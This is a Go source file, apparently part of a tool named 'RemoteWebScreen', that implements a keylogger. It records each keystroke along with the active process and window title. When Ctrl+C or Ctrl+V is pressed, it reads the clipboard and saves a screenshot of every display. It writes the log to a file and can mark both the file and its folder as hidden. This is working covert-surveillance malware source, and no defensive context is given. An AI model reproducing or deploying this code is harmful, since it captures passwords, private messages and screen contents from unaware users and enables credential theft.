package keyboard

import (
	"RemoteWebScreen/win32"
	"fmt"
	"github.com/atotto/clipboard"
	"github.com/kbinani/screenshot"
	"image"
	"image/png"
	"log"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"syscall"
	"time"
)

var filetime string
var mutext sync.Mutex

func keyDump(path string, isHidden bool) {
	go func() {
		var key string
		var ctrlc_v string
		var ctrlc_bool bool
		file, err := openFile(path, isHidden)
		if err != nil {
			//log.Printf("open file %v", err)
		}
		defer func() {
			file.Close()
			err := recover()
			log.Println(err)
		}()
		for {
			select {
			case event := <-kbEventChanel:
				vkCode := event.VkCode
				ctrlPressed := win32.IsKeyDown(win32.VK_CONTROL)
				//ctrlPressed && keyMap[vkCode] == "a" ||
				if ctrlPressed && keyMap[vkCode] == "c" || ctrlPressed && keyMap[vkCode] == "v" {
					ctrlc_bool = true
					currentTime := time.Now()
					filetime = currentTime.Format("2006_01_02_15_04_05_04")
					Ctrl_screen(Screen_logPath, filetime)
				}
				if keyMap[vkCode] == "Enter" || keyMap[vkCode] == "Tab" {
					if len(key) > 0 {
						if ctrlc_bool {
							ctrlc_v, _ = clipboard.ReadAll()
							key = key + "\n[剪切板(Ctrl+c/v):" + ctrlc_v + "][截屏:" + Screen_logPath + "\\" + filetime + ".png]"
							ctrlc_bool = false
						}
						fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
						mutext.Lock()
						if err := writeToFile(file, fmtStr); err != nil {
							log.Println(err)
						}
						mutext.Unlock()
						key = ""
						ctrlc_v = ""
					}
				} else {
					if vkCode >= 48 && vkCode <= 90 {
						if getCapsLockSate() { // 大小写
							key += strings.ToUpper(keyMap[vkCode])
						} else {
							key += keyMap[vkCode]
						}
					} else if isExKey(vkCode) {
						key += fmt.Sprintf("[%s]", keyMap[vkCode])
					} else {
						key += keyMap[vkCode]
					}
				}
			case event := <-msEventChanel:
				if len(key) > 0 {
					if ctrlc_bool {
						ctrlc_v, _ = clipboard.ReadAll()
						key = key + "\n[剪切板(Ctrl+c/v):" + ctrlc_v + "][截屏:" + Screen_logPath + "\\" + filetime + ".png]"
						ctrlc_bool = false
					}
					fmtStr := fmtEventToString(key, event.ProcessId, event.ProcessName, event.WindowText, event.Time)
					mutext.Lock()
					if err := writeToFile(file, fmtStr); err != nil {
						log.Println(err)
					}
					mutext.Unlock()
					key = ""
					ctrlc_v = ""
				}
			}
		}
	}()
}

func isExKey(vkCode win32.DWORD) bool {
	_, ok := exKey[vkCode]
	return ok
}

func fmtEventToString(keyStr string, processId uint32, processName string, windowText string, t time.Time) string {
	content := fmt.Sprintf("[%s:%d %s %s]\r\n%s\r\n", processName, processId,
		windowText, t.Format("15:04:05 2006/01/02"), keyStr)
	return fmt.Sprintf("%s\t\r\n", content)
}

func writeToFile(file *os.File, str string) error {
	// write file
	if _, err := file.WriteString(str); err != nil {
		return err
	} else {
		err := file.Sync()
		if err != nil {
			return err
		}
	}
	return nil
}

func openFile(path string, isHidden bool) (*os.File, error) {
	p := strings.Split(path, string(os.PathSeparator))
	if len(p) > 2 {
		// 创建目录
		dir := strings.Join(p[:len(p)-1], string(os.PathSeparator))
		err := os.MkdirAll(dir, os.ModePerm)
		if err != nil {
			return nil, err
		}
		// 隐藏目录
		if isHidden {
			if err := hiddenFile(dir); err != nil {
				return nil, err
			}
		}
	}
	file, err := os.OpenFile(path, os.O_APPEND|os.O_CREATE|os.O_RDWR|os.O_SYNC, 0644)
	if err != nil {
		return nil, err
	}

	if isHidden {
		if err := hiddenFile(path); err != nil {
			return nil, err
		}
	}
	return file, nil
}

func hiddenFile(path string) error {
	n, err := syscall.UTF16PtrFromString(path)
	if err != nil {
		return err
	}
	return syscall.SetFileAttributes(n, syscall.FILE_ATTRIBUTE_HIDDEN)
}

func Ctrl_screen(tempDir, filename string) {
	filePath := filepath.Join(tempDir, filename+".png")
	n := screenshot.NumActiveDisplays()
	var all image.Rectangle = image.Rect(0, 0, 0, 0)
	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)
		all = bounds.Union(all)
	}

	img, err := screenshot.Capture(all.Min.X, all.Min.Y, all.Dx(), all.Dy())
	if err != nil {
		log.Printf("Error capturing screen: %v", err)
		return
	}

	file, err := os.Create(filePath)
	if err != nil {
		log.Printf("Error creating file: %v", err)
		return
	}
	defer file.Close()

	if err := png.Encode(file, img); err != nil {
		log.Printf("Error encoding PNG: %v", err)
		return
	}
}
